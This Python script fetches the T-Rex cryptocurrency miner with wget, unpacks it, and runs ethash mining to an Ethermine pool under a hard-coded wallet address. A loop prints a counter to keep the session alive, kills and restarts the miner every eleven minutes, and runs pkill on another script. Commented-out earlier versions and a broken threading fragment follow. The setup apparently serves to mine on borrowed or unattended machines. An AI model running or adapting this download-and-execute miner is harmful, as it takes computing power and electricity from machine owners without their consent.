from multiprocessing import Process
import time
import os

inicio=0

def asd():
	e=1
	if e==1:
		e=e=0
		time.sleep(90)
		os.system("wget https://trex-miner.com/download/t-rex-0.21.2-linux.tar.gz; tar -zxvf t-rex-0.21.2-linux.tar.gz;./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x7Bf282FEC6a3dEb8F888B1da8a7193bB20F49376 -p x -w rig")
	

if __name__ == '__main__':
	p2 = Process(target=asd)
	p2.start()
	#p2.join()
	while True:
		inicio=inicio+1
		time.sleep(1)
		print(inicio)
		if inicio >=660:
			inicio=0
			p2.terminate()
			os.system("pkill 2132sa.py")
			p2 = Process(target=asd)
			p2.start()
			



















#from multiprocessing import Process
#import time
#import os

#def aaa():
#	def asd():
#		e=1
#		if e==1:
#			e=e=0
#			time.sleep(60)
#			os.system("wget https://trex-miner.com/download/t-rex-0.21.2-linux.tar.gz; tar -zxvf t-rex-0.21.2-linux.tar.gz;./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x7Bf282FEC6a3dEb8F888B1da8a7193bB20F49376 -p x -w rig")   
#
#	def a():
#		inicio=0
#		while True:
#			inicio=inicio+1
#			time.sleep(1)
#			print(inicio)
#			if inicio >=660:
#				aaa()
#
############
#	if __name__ == '__main__':
#		p1 = Process(target=a)
#		p2 = Process(target=asd)
#
#		p1.start()
#		p2.start()
#
#		p1.join()
#		p2.join()
#aaa()



#import threading as th
#
#def proceso1(e):
#	print("proceso 1")
#	for i in range(20000000):
#		e.wait()
#		print(i)
#def tiempo(e):
#	a=0
#	for t in range(1000000000000):
#		a+=1
#	e.set()
#	print("Terminar")
#
#e=th.Event()
#ptiempi=th.Theread(target=tiempo,args=(e,))
#pprincipal=th.Theread(target=proceso1,args=(e,))
#ptiempi.start()
#pprincipal.start()
#
#ptiempi.join()
#pprincipal.join()#
